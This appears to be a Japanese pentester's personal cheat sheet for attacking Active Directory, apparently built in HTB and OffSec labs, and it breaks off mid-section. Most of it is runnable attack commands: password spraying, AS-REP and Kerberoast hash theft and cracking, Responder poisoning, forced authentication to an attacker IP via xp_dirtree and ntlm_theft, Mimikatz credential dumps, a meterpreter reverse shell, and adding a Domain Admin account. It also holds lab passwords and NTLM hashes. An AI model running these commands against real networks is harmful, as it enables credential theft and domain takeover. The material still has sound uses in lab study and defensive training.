
> [!info] この文書の構成
> - **[[#0. 進行表]]** … 攻撃の流れ（フェーズ順）。迷ったらここ。
> - 以降は**技術別リファレンス**。「見つける」と「使う」を分けてある。
> - 同じコマンドは1箇所にだけ書く。フェーズの重複は進行表で表現する。
> - PowerView は [[#PowerViewの読み込み]] を一度読めばOK。

# 0. 進行表

> チェックリストなので、同じ項目が複数フェーズに出るのは意図的。
> 「いつやるか」は重複してよいが、「やり方」は各節に1回だけ書く。

## 認証情報なし

- [ ] ホスト発見 → [[#ホスト発見]]
- [ ] DC判定 → [[#DC判定]]
- [ ] ドメイン名の特定 → [[#ドメイン名の特定]]
- [ ] null / guest でユーザー列挙 → [[#ユーザー・グループ]]
- [ ] ユーザーリスト作成（`valid_ad_users`）→ [[#ユーザー・グループ]]
- [ ] パスワードポリシー確認（ロックアウト回避）→ [[#パスワードポリシー]]
- [ ] AS-REP Roasting → [[#AS-REP Roasting]]
- [ ] パスワードスプレー / 使い回し → [[#パスワードスプレー]]
- [ ] ポイズニングでハッシュ取得 → [[#LLMNR・NBT-NS・NTLMポイズニング]]
- [ ] **初回の認証情報を確保**

## 初回の認証情報を取ったら（一般ユーザー）

- [ ] その資格情報が使えるか確認（`nxc smb`）
- [ ] 認証ありの列挙 → [[#ユーザー・グループ]] / [[#共有・ファイル]]
- [ ] BloodHound で経路を可視化 → [[#BloodHound と SharpHound]]
- [ ] アカウント属性の洗い出し（AS-REP / Kerberoast / PASSWD_NOTREQD）→ [[#アカウント属性（UAC）]]
- [ ] ACL / 委任 / 信頼関係 → [[#ACL・委任・信頼関係]]
- [ ] GPO → [[#GPO]] / ADCS → [[#ADCS]]
- [ ] Kerberoasting → [[#Kerberoasting]]
- [ ] 共有の中身を漁る → [[#共有・ファイル]]
- [ ] 設定ミス（GPP / description / SYSVOL）→ [[#設定ミス由来]]

## ローカル管理者を取ったら

- [ ] ローカル列挙（WinPEAS / セキュリティコントロール）→ [[#ローカルホスト]]
- [ ] メモリ・SAM から資格情報 → [[#ローカル資格情報]]
- [ ] 履歴・KeePass・LaZagne → [[#ローカル資格情報]]
- [ ] トークンなりすまし → [[#トークンなりすまし]]
- [ ] IP を確認して別ネットワークを探す → [[#ipconfig]]
- [ ] PtH / PtT で横展開 → [[#PtH・PtT・PtP]]
- [ ] RDP / WinRM / MSSQL → [[#リモート接続]]

## ドメイン管理者を取ったら

- [ ] DCSync → [[#DCSync]]
- [ ] Golden Ticket → [[#Golden Ticket]]
- [ ] 信頼関係 / SID History → [[#SID History と ExtraSIDs]]
- [ ] 後処理（WinRM 有効化など）→ [[#WinRMの有効化]]


# 1. 列挙

## ホスト発見

認証情報なしで可能。

### fping

指定したIPアドレス範囲内のアクティブなホストを高速に特定する。

```shell
fping -asgq 172.16.5.0/23
```

## DC判定

DCである可能性が高いポート。

- `88/tcp` (Kerberos) - DCの可能性高
- `135/tcp` (RPC)
- `139/tcp`, `445/tcp` (SMB)
- `389/tcp` (LDAP) - DCが持つディレクトリサービス
- `636/tcp` (LDAPS)
- `3268/tcp`, `3269/tcp` (Global Catalog) - ほぼ確定でDC

### nmap

サービスとバージョン情報をスキャンし、DCかどうかのより確実な判断。

```shell
nmap -sV <IP>
```

## ドメイン名の特定

正しいドメイン名（`defaultNamingContext`）を確認する。

```sh
ldapsearch -x -H ldap://$Target_IP -s base -b "" "(objectClass=*)" defaultNamingContext rootDomainNamingContext namingContexts
```

### ActiveDirectoryモジュール（ドメイン）

PowerShell で AD モジュールを使う場合は、先に読み込む。

```powershell
Import-Module ActiveDirectory
```

```powershell
Get-ADDomain
```

### PowerView（ドメイン）

読み込み: [[#PowerViewの読み込み]]

```powershell
Get-Domain
```

```powershell
Get-DomainController
```

## ユーザー・グループ

### enum4linux-ng

SMB / RPC / LDAP 経由で Windows / Samba ホストから情報を列挙する。

```sh
enum4linux-ng -A $Target_IP
```

ユーザーリストだけ抜き出す。

```shell
enum4linux-ng -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

既に認証情報がわかっている場合。

```sh
enum4linux-ng -u <ユーザー名> -p <パスワード> $Target_IP
```

### rpcclient

RPC サービスに接続し、ドメインユーザーなどの情報を列挙（Null セッションでも可）。

```shell
rpcclient -U "" -N $Target_IP
```

```shell
rpcclient $> enumdomusers
```

### CrackMapExec

SMB プロトコルを使用して、ネットワーク上のホストに対してユーザー列挙や認証攻撃を行う。

```shell
crackmapexec smb <DC_IP> --users
```

### NetExec（nxc）

guest で LDAP に接続してユーザー列挙。
- 特定のユーザーの `description` フィールドにパスワードが埋め込まれていることがあり、これで見つけられる
	- 使用例: [[Ledger#nxc]]

```sh
nxc ldap <Domain> -u 'guest' -p '' --users --local-auth
```

SMB 共有の確認。

```sh
nxc smb <DC_IP> -u 'guest' -p '' --shares --local-auth
```

### ldapsearch

LDAP サーバーに接続し、指定した条件でユーザー情報などを検索・列挙（匿名バインドも可能）。

```shell
ldapsearch -H <DC_IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

*(`DC=DOMAIN,DC=LOCAL` は対象ドメインの識別名に置き換える)*

自分の権限の列挙。

```sh
ldapsearch -x -H ldap://$Target_IP -D "USERNAME@DOMAIN" -w 'PASSWORD' -b "DC=PUPPY,DC=HTB" "(sAMAccountName=USERNAME)"
```

### ldapdomaindump

```sh
ldapdomaindump ldap://$Target_IP --no-json -d <domain>
```

```sh
ldapdomaindump ldap://$Target_IP -u '<DOMAIN>\<username>' -p '<password>' --no-json
```

### windapsearch

AD の LDAP 情報を列挙する Python スクリプト。ユーザー列挙に使う。

```shell
./windapsearch.py --dc-ip <DC_IP> -u "" -U
```

認証ありの場合。

- Domain Admins 列挙
```shell
python3 windapsearch.py --dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD> --da
```
- 特権ユーザー列挙
```shell
python3 windapsearch.py --dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD> -PU
```

### Kerbrute

Kerberos プロトコルを利用して、ユーザーリストから有効なドメインユーザーを列挙。

```shell
kerbrute userenum -d <DOMAIN_NAME> --dc <DC_IP> /path/to/userlist.txt
```

### ActiveDirectoryモジュール（ユーザー・グループ）

```powershell
Get-ADObject -LDAPFilter '(objectClass=group)' | select name
```

```powershell
Get-ADGroup -Filter * | select name
```

```powershell
Get-ADGroupMember -Identity "<GROUP_NAME>"
```

各種オブジェクトの件数。

```powershell
(Get-ADUser -Filter *).count
(Get-ADComputer -Filter *).count
(Get-ADGroup -Filter *).count
```

### PowerView（ユーザー・グループ）

読み込み: [[#PowerViewの読み込み]]

```powershell
Get-DomainUser -Identity <USERNAME>
```

```powershell
Get-DomainGroupMember -Identity "<GROUP_NAME>" -Recurse
```

## アカウント属性（UAC）

> **フェーズをまたぐので独立セクションにしている。**
> AS-REP / Kerberoast / 空パスワード などの「対象の洗い出し」はすべてここ。
> 属性の意味は [[Pentest_Theory/Active Directory#UACの属性]]、考え方は [[Pentest_Theory/Active Directory#UACの洗い出し]]。

### UACフィルタの書き方

PowerShell のフィルター演算子: [[Pentest_Theory/Active Directory#Powershellコマンドのフィルター演算子|Powershellコマンドのフィルター演算子]]

### ActiveDirectoryモジュール（属性）

管理者によって無効にされたアカウント（`userAccountControl` の 2 = ACCOUNTDISABLE）を検索する。

```powershell
Get-ADObject -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' -Properties * | select samaccountname,useraccountcontrol
```

管理者グループ（`adminCount = 1`）。

```powershell
Get-ADGroup -Filter "adminCount -eq 1" | select Name
```

AS-REP Roasting の対象（`DoesNotRequirePreAuth`）。

```powershell
Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}
```

Kerberoasting の対象（`ServicePrincipalName` を持つ管理者）。

```powershell
Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl
```

SPN を持つユーザーを全件。

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### PowerView（属性）

読み込み: [[#PowerViewの読み込み]]

事前認証が不要なユーザー（AS-REP の対象）

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname
```

パスワード不要のユーザー（`PASSWD_NOTREQD`）

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD
```

SPN を持つユーザー（Kerberoast の対象）

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

## パスワードポリシー

ロックアウトを避けるため、スプレー前に確認する。

### ldapsearch（ポリシー）

```shell
ldapsearch -h <DC_IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### net.exe

```shell
net accounts
```

### PowerView（ポリシー）

読み込み: [[#PowerViewの読み込み]]

```powershell
Get-DomainPolicy
```

## 共有・ファイル

### CrackMapExec（共有）

認証情報がある場合。

- ドメインユーザー列挙
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> --users
```
- ドメイングループ列挙
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> --groups
```
- ログオン中ユーザー列挙
```shell
crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --loggedon-users
```
- 共有フォルダ列挙
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> --shares
```
- 共有フォルダ探索
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> -M spider_plus --share '<SHARE_NAME>'
```

### SMBMap

SMB 共有を列挙し、アクセス権限の確認やファイルのダウンロード / アップロードができる。

- アクセス可能共有と権限
```shell
smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <TARGET_IP>
```
- 再帰的ディレクトリ一覧
```shell
smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <TARGET_IP> -r '<SHARE_NAME>' --dir-only
```

### NetExec（スパイダー）

```sh
nxc smb 172.16.191.83 -u offsec -p lab --spider C --pattern txt,xml,config,ini --depth 5
```

### Snaffler

共有フォルダやファイルから認証情報・機密データを探索する。

```powershell
Snaffler.exe -s -d <DOMAIN_NAME> -o snaffler.log -v data
```

## ACL・委任・信頼関係

### PowerView（ACL列挙）

読み込み: [[#PowerViewの読み込み]]

不適切な ACL 設定（書き込み権限など）の探索。

```powershell
Find-InterestingDomainAcl
```

特定ユーザーの権限。

```powershell
$sid = Convert-NameToSid <USER>; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

### PowerView（信頼）

他ドメインのユーザーがローカルドメインの特権グループに所属していないか確認。

```powershell
Get-DomainForeignGroupMember -Domain <TARGET_DOMAIN>
```

### ActiveDirectoryモジュール（信頼）

ドメインの信頼関係。

```powershell
Get-ADTrust -Filter *
```

## GPO

### PowerView（GPO）

読み込み: [[#PowerViewの読み込み]]

ドメイン内の GPO を列挙し、設定や ACL を確認する。

- 出力に `Default Domain Policy` があったらピンと来る
	- ドメイン全体のすべてのコンピュータとユーザーのポリシーなので、これに `GenericAll` があると、GPOADM 自身を管理者グループに入れられてしまうことがある

```powershell
Get-DomainGPO
```

ACL 確認（`$sid` は上の ACL 列挙で定義したもの）。

```powershell
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

## ADCS

AD CS: Active Directory Certificate Services。Windows ドメイン環境に証明書を発行・管理するサービス。
証明書ベースの権限昇格や認証回避の脆弱性（ESC1〜ESC8）を検出・悪用する。

- ESC1〜ESC8
	- 証明書関連の典型的な脆弱性パターン
	- たとえば ESC1 は「ユーザーが自分で証明書を要求でき、証明書で任意のユーザーを偽装できる」問題

### Certipy（検出）

パスワード認証。

```sh
certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -target <DOMAIN> -dc-ip <DC-IP> -ns <DC-IP> -enabled -vulnerable -stdout
```

Kerberos 認証。

```sh
certipy-ad find -k -no-pass -target <FQDN_DNS> -dc-ip <DC_IP> -enabled -vulnerable -stdout
```

使用例: [[Ledger#Certpy]]

## DNS

### adidnsdump

有効なドメインユーザーアカウントを使用して、ドメイン内のすべての DNS レコードを列挙。

```shell
adidnsdump -u <DOMAIN_NAME>\\<USER> ldap://<DC_IP> -r
```

## ローカルホスト

ホストに侵入した後の列挙。

### ipconfig

管理者権限を取ったら、まず `ipconfig` して他のネットワークの IP を持っていないか確認する。

### WinPEAS

権限昇格や横展開に繋がる情報を広範囲に収集する。

```powershell
# 色付きで見る方法
.\winPEASx64.exe ansi > winpeas_ansi.txt
```

リソースが足りなくて落ちる時はこれ。

```sh
Start-Process -FilePath "C:\Users\wario\Documents\winPEASx64.exe" -ArgumentList "all" -RedirectStandardOutput "C:\Users\wario\Documents\winpeas_output.txt" -NoNewWindow
```

```sh
Start-Process -FilePath "C:\Users\Administrator\Desktop\winPEASx64.exe" -RedirectStandardOutput "C:\Users\Administrator\Desktop\winpeas_output.txt" -NoNewWindow
```

### セキュリティコントロール

- Windows Defender のリアルタイム保護などの状態確認
```powershell
Get-MpComputerStatus
```
- 適用されている AppLocker ポリシー（アプリケーション実行制限）の確認
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
- 現在の PowerShell セッションの言語モード（FullLanguage / ConstrainedLanguage など）
```powershell
$ExecutionContext.SessionState.LanguageMode
```

### インストール済みソフトウェア

```sh
get-ciminstance win32_product | fl
```

Microsoft 製ソフトウェアの除外。

```sh
get-ciminstance win32_product -Filter "NOT Vendor like '%Microsoft%'" | fl
```

### LAPS

読み込み: [[#PowerViewの読み込み]]

- LAPS で管理されているローカル管理者パスワードを読み取る権限を持つグループの検索
```powershell
Find-LAPSDelegatedGroups
```
- 各コンピューターの権限をチェックし、パスワード読み取り権限を持つグループ / ユーザーの特定
```powershell
Find-AdmPwdExtendedRights
```
- LAPS が有効なコンピューターの一覧、パスワード有効期限、権限があれば平文パスワードの表示
```powershell
Get-LAPSComputers
```

### RSATの有無

```powershell
Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property Name, State
```

利用可能なすべての RSAT をインストールする。

```powershell
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability –Online
```

- インストールが完了すると、すべてのツールが `コントロールパネル` の `管理ツール` から利用可能になる
- 詳細: [[#RSAT]]

### 侵入後に控えておく情報

- ユーザー名とホスト名
- 現在のユーザーのグループメンバーシップ
- 既存のユーザーとグループ
- オペレーティングシステム、バージョン、アーキテクチャ
- ネットワーク情報
- インストールされているアプリケーション
- 実行中のプロセス
- ドメインの機能レベル
- ドメインのパスワードポリシー
- AD ユーザーの完全なインベントリ
- AD コンピューターの完全なインベントリ
- AD グループとメンバーシップの完全なインベントリ
- ドメインの信頼関係
- オブジェクトの ACL
- グループポリシーオブジェクト（GPO）の情報
- リモートアクセス権

## BloodHound と SharpHound

AD オブジェクト間の関係性を収集・分析し、攻撃経路を視覚化する。
LDAP の権限があれば実行して取得できる。

### コレクター

- 時刻を合わせる
```sh
sudo rdate -n $Target_IP
```

- Linux コレクター
```shell
sudo bloodhound-python -u '<USER>@<domain>' -p '<PASSWORD>' -ns <DC_IP> -d <DOMAIN> -c all
```
- 例
	- `sudo bloodhound-python -u 'levi.james@puppy.htb' -p 'KingofAkron2025!' -ns 10.129.232.75 -d puppy.htb -c all`

エラーが出る時。

```sh
sudo bloodhound-python -u 'Eric.Wallows' -p 'EricLikesRunning800' -d secura.yzx -dc dc01.secura.yzx -ns 192.168.191.97 -c all
```

- Windows コレクター（SharpHound）
```powershell
.\SharpHound.exe -c All --zipfilename <OUTPUT_ZIP_NAME>
```

### 起動

- Neo4j 起動
```shell
sudo neo4j start
```
- BloodHound GUI 起動
	- neo4j: data-warning-vocal-sphere-sponsor-7137
```shell
bloodhound
```


# 2. 認証情報の取得

## パスワードスプレー

**既存の認証情報だけではなく、新たにわかったユーザーが使い回している可能性もある。**

### rpcclient（スプレー）

少数の共通パスワードを多数のユーザーアカウントに対して試行。

```shell
for u in $(cat valid_ad_users);do rpcclient -U "$u%<PASSWORD_TO_SPRAY>" -c "getusername;quit" <DC_IP> | grep Authority; done
```

### Kerbrute（スプレー）

Kerberos 認証を利用して、ユーザーリストに対し単一のパスワードを試行。

```shell
kerbrute passwordspray -d <DOMAIN_NAME> --dc <DC_IP> valid_ad_users '<PASSWORD_TO_SPRAY>'
```

### NetExec（スプレー）

SMB 経由で、ユーザーリストに対し単一のパスワードを試行し、成功したアカウントを特定する。

- **DC に対してではなく AD 参加マシンに対して実行する場合、`--local-auth` と `--local-auth` なしの2回実行が必要**
- 結果で `STATUS_ACCOUNT_LOCKED_OUT` / `USER_ACCOUNT_LOCKED` が出ているものは、本当はログインできるはず
	- ドメイン認証は、ドメイン参加マシン1台に対してだけ行えばよい
- ユーザー名とパスワードを混ぜないオプション: `--no-bruteforce`

```shell
netexec smb <IP> -u valid_ad_users -p '<PASSWORD_TO_SPRAY>' --continue-on-success --local-auth
netexec smb <IP> -u valid_ad_users -p '<PASSWORD_TO_SPRAY>' --continue-on-success
netexec smb <IP> -u valid_ad_users -p '<PASSWORD_TO_SPRAY>' --continue-on-success --no-bruteforce
```

ハッシュでスプレーしようとして `Invalid NTLM hash length 34, authentication not sent` が出たら、LM ハッシュを付ける。

```sh
cat > hash_172_new.txt << 'EOF'
aad3b435b51404eeaad3b435b51404ee:abf36048c1cf88f5603381c5128feb8e
aad3b435b51404eeaad3b435b51404ee:5be63a865b65349851c1f11a067a3068
aad3b435b51404eeaad3b435b51404ee:fdf36048c1cf88f5630381c5e38feb8e
aad3b435b51404eeaad3b435b51404ee:8e9e1516818ce4e54247e71e71b5f436
EOF
```

**NTLM が無効化されている場合**
- ホスト名（FQDN）を使用する

```sh
netexec smb <FQDN_Domain_Name> -u 'valid_ad_users' -p '<PASSWORD_TO_SPRAY>' -d <Domain_Name> -k --local-auth
```

例。

```sh
netexec smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k --local-auth
```

### DomainPasswordSpray

PowerShell スクリプトで、ドメインユーザーに対してパスワードスプレー攻撃を実行。

```powershell
. .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password '<PASSWORD_TO_SPRAY>' -OutFile spray_success -ErrorAction SilentlyContinue
```

### ユーザー名とパスワードが同じ

- [[BabyTwo]] で出てきた手法
- パスワードの使い回しと同じレベルで意外とある
	- とりあえずやってみるのもいい
	- 以下のコマンドはブルートフォースモードなので、他のユーザーアカウント名をパスワードとして扱っている場合も含む

```sh
nxc smb 10.129.234.72 -u valid_ad_users -p valid_ad_users --continue-on-success --local-auth
```

### ドメイン間の使い回し

異なるドメイン間で管理者アカウントのパスワードが再利用されていないか確認する。

## AS-REP Roasting

事前認証が不要なユーザーの AS-REP を要求してハッシュを得る。
対象の列挙は [[#アカウント属性（UAC）]]。

### Rubeus（AS-REP）

```powershell
.\Rubeus.exe asreproast /user:<USERNAME> /nowrap /format:hashcat
```

### GetNPUsers.py

```shell
impacket-GetNPUsers <DOMAIN_NAME>/ -dc-ip <DC_IP> -no-pass -usersfile valid_ad_users -format hashcat -outputfile asrep_hashes.txt
```

### hashcat（AS-REP）

AS-REP ハッシュ（モード 18200）を辞書攻撃 / ブルートフォースでクラック。

```shell
hashcat -m 18200 asrep_hashes.txt /path/to/wordlist.txt
```

## Kerberoasting

対象（SPN を持つユーザー）の列挙は [[#アカウント属性（UAC）]]。

### TGSチケット要求

列挙した SPN アカウントの TGS を要求し、ハッシュを取得する。

- 一度も使われたことがないアカウントは、ダミーアカウントかもしれないので注意

- GetUserSPNs.py（列挙）
```shell
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
```
- GetUserSPNs.py（要求）
```shell
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -request -outputfile tgs_tickets
```
- Rubeus
```powershell
.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap /format:hashcat
```
    *(RC4 強制は `/tgtdeleg` オプション)*
- PowerShell（手動）
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```
- Mimikatz でメモリからエクスポート
```powershell
kerberos::list /export
```
- setspn.exe（SPN の列挙）
```shell
setspn.exe -Q */*
```

### ハッシュクラック

取得した TGS ハッシュ（モード 13100）をオフラインでクラック。

- Hashcat
```shell
hashcat -m 13100 tgs_tickets /path/to/wordlist.txt
```
- John
```shell
john --wordlist=/path/to/wordlist.txt tgs_tickets
```

### クロスフォレスト

信頼関係のある別フォレストのドメインに対して Kerberoasting を行う。

- Rubeus
```powershell
.\Rubeus.exe kerberoast /domain:<TARGET_FOREST_DOMAIN> /user:<TARGET_SPN_USER> /nowrap
```
- GetUserSPNs.py
```shell
GetUserSPNs.py -request -target-domain <TARGET_FOREST_DOMAIN> <CURRENT_DOMAIN>/<USER>:<PASSWORD>
```

## LLMNR・NBT-NS・NTLMポイズニング

### Responder

ネットワーク内で LLMNR や NBT-NS リクエストを偽装応答し、NTLM ハッシュを奪取する。

```shell
sudo responder -I <NIC>
```

### MSSQLからの強制認証

MSSQL へのログイン情報があったとき。

- サービスアカウントを確認する
```sh
exec master..xp_instance_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSQL$SQLMOCK', N'ObjectName';
```

- サービスアカウントの NTLM ハッシュを取得する
```sh
exec master..xp_dirtree '\\10.10.14.62\share';
```

### ntlm_theft

SMB に書き込みができる時に使用する。
- https://github.com/Greenwolf/ntlm_theft

```sh
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
```

Responder と連携し、NTLMv2-SSP チャレンジ / レスポンスハッシュを取得。

```shell
python3 ntlm_theft.py -g all -s <RESPONDER_IP> -f generate
```

### Inveigh

Windows 上で動作する LLMNR / NBT-NS / mDNS / DNS / DHCPv6 ポイズニングおよび中間者攻撃ツール。

```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### LNKファイル

1. 悪意ある `.lnk`（ショートカット）ファイルを作る
2. その `.lnk` ファイルを共有フォルダに置く
3. ターゲットがアクセス・表示するのを待つ
4. Responder でハッシュを取得

`.lnk` ファイルを公開共有フォルダに設置する。

```sh
netexec smb <AD参加ホスト> -d <ドメイン名> -u <ユーザー名> -p <パスワード> -M slinky -o NAME=test SERVER=<攻撃者IP>
```

Responder を実行し、ハッシュが飛んでくるのを待つ。

```sh
sudo responder -I eth0 -dPv
```

### プリンタバグ

MS-RPRN。プリントスプーラープロトコルの欠陥を利用し、サーバーに任意ホストへの認証を強制する（LDAP リレーなど）。

## 設定ミス由来

### GPP

グループポリシー設定に保存された暗号化パスワード（復号可能）を悪用する。

- CrackMapExec
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> -M gpp_password
```
- 手動復号（gpp-decrypt）
```shell
gpp-decrypt <CPASSWORD_FROM_XML>
```

### description欄

ユーザーアカウントの説明欄などに不用意に記載されたパスワードを探索する。

```powershell
Get-DomainUser | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

### SYSVOL

`\\<DC_IP>\SYSVOL\<DOMAIN_FQDN>\scripts` 内のスクリプトにハードコードされた認証情報を確認する。

### LDAP認証情報

アプリケーションやプリンタの Web 管理コンソールから LDAP 認証情報を窃取する。

## ローカル資格情報

### Mimikatz（ローカル）

ローカルシステムのメモリから平文パスワード、NTLM ハッシュ、Kerberos チケットなどを抽出する。

```sh
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "lsadump::lsa" "lsadump::secrets" "exit" > mimikatz_full_dump.txt
```

1行ずつやる場合。

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
lsadump::lsa
lsadump::secrets
```

### LaZagne

```powershell
.\LaZagne.exe all
```

### PowerShell履歴

Windows 10 から、Linux で言うところの `.bash_history` がデフォルトで有効になった。
ここに平文の認証情報が書いてあることもある。

```sh
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### KeePass

KeePass が含まれていないか確認する。

```sh
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

John The Ripper の `keepass2john` を使って、ハッシュの形にする。

```sh
keepass2john Database.kdbx > keepass.hash
```

hashcat の辞書攻撃には、ファイル文頭の `Database:` を削除してから `-m 13400` で回す。

```sh
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### トークンなりすまし

仕組み。
- ユーザーがログオンすると、**アクセストークン**が発行される
- 他のプロセスやサービスがそのユーザーのトークンを「開いたまま持っている」と、それを**借りて（impersonate）なりすまし**ができる

まず meterpreter シェルを用意する（msfconsole 内）。

```sh
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
# RHOSTは、AD参加ホストであればなんでも。DC以外でも良い。
set RHOSTS <AD参加ホストIP>
set smbuser <ユーザーネーム>
set smbpass <パスワード>
set smbdomain <ドメイン名>
set LHOST 
```

シェル確立後、なりすまし用のモジュールをロードする。

```sh
meterpreter > load incognito
```

ユーザー（user）に絞って、なりすまし可能なトークンを列挙する。
- ここまでで、どのアカウントになりすますべきか知っているべき

```sh
meterpreter > list_tokens -u
```

なりすますユーザーを指定する。
- スラッシュを2つ付ける
	- 例: `MARVEL\\fcastle`

```sh
meterpreter > impersonate_token <なりすますユーザー名>
meterpreter > shell
whoami
```

高い権限でなりすました後、その権限でユーザーを新しく作成する。
作成したアカウントで `secretsdump.py` などを実行すると、すべてのハッシュを取得できる。

```windows shell
net user /add <ユーザーネーム> <パスワード> /domain
net group "Domain Admins" <ユーザーネーム> /ADD /DOMAIN
```


# 3. 実行・横展開

## リモート接続

### RDP

GUI ベースでリモートホストに接続し操作する。

- アクセス権確認（PowerView）
```powershell
Get-NetLocalGroupMember -ComputerName <TARGET_HOST> -GroupName "Remote Desktop Users"
```
- 接続（xfreerdp）
```shell
xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD> /d:<DOMAIN>
```

### WinRM

PowerShell を使用してリモートホストを管理・操作する。`evil-winrm` は特にペンテストで有用。

- アクセス権確認（PowerView）
```powershell
Get-NetLocalGroupMember -ComputerName <TARGET_HOST> -GroupName "Remote Management Users"
```
- 接続（evil-winrm）
```shell
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'
```

### SQL Server

sysadmin 権限を持つアカウントで SQL Server に接続し、OS コマンド実行などを試行する。

- インスタンス列挙（PowerUpSQL）
```powershell
Get-SQLInstanceDomain
```
- クエリ実行（PowerUpSQL）
```powershell
Get-SQLQuery -Instance "<INSTANCE>" -username "<USER>" -password "<PASSWORD>" -query "<SQL_QUERY>"
```
- xp_cmdshell 有効化 & コマンド実行（PowerUpSQL）
```powershell
Get-SQLQuery -Instance "<INSTANCE>" ... -query "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
```

```powershell
Get-SQLQuery -Instance "<INSTANCE>" ... -query "EXEC xp_cmdshell 'whoami'"
```
- 接続（mssqlclient.py）
```shell
mssqlclient.py <DOMAIN>/<USER>@<TARGET_IP> -windows-auth
```

```shell
SQL> enable_xp_cmdshell
```

```shell
SQL> xp_cmdshell whoami
```

### wmiexec

WMI 経由でターゲットホスト上でコマンドをセミインタラクティブに実行する。

```shell
wmiexec.py <DOMAIN_NAME>/<USER>:'<PASSWORD>'@<TARGET_IP>
```

### RunasCs

すでにアカウントの認証情報はわかっているが、そのアカウントをリモートユーザーとしては使えないことが往々にしてある。
そんな時に、ターミナル上でアカウントを切り替えてコマンドを実行したり、シェルを作れるツール。

- https://github.com/antonioCoco/RunasCs

`svc_ldap` として `cmd /c whoami /all` を実行する。

```sh
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "cmd /c whoami /all"
```

## PtH・PtT・PtP

### CrackMapExec（PtP）

ユーザーの認証情報が他のマシンでも使用されていないか確認する。
認証情報とネットワーク範囲・ドメインを指定すると、一括でログインできるマシンを洗い出せる。

```sh
crackmapexec smb <ip/ネットワーク範囲> -u <user> -d <domain> -p <pass>
```

### CrackMapExec（PtH）

ユーザーの NTLM ハッシュを使用して SMB 経由で認証し、コマンド実行などを行う。

```shell
crackmapexec smb <TARGET_IP/ネットワーク範囲> -u <USER> -H <NTHASH>
```

### smbclient（PtH）

```shell
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

### Mimikatz（PtH）

NTLM ハッシュをメモリに注入し、そのユーザーになりすましてプロセスを実行する。

```powershell
privilege::debug
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH> /run:"cmd.exe"
```

```cmd
mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:<NTハッシュ>
```

### Mimikatz（PtT）

Kerberos チケットファイル（.kirbi）をメモリに注入し、そのチケットで認証する。

```powershell
kerberos::ptt /path/to/ticket.kirbi
```

### Rubeus（PtT）

NT ハッシュを RC4 鍵として TGT を要求する。

```cmd
rubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94
```

Base64 エンコードされたチケットや .kirbi ファイルをメモリに注入して Kerberos 認証する。

```powershell
